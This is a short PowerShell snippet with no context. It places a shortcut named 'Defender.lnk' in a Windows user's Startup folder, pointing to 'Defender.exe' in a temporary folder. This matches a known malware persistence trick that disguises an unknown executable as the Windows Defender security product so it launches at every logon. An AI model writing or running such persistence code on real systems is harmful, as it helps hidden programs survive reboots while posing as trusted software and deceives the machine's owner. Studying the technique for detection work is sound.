$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("c:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Defender.lnk")
$Shortcut.TargetPath = "c:\Users\User\AppData\Local\Temp\Defender.exe"
$Shortcut.Save()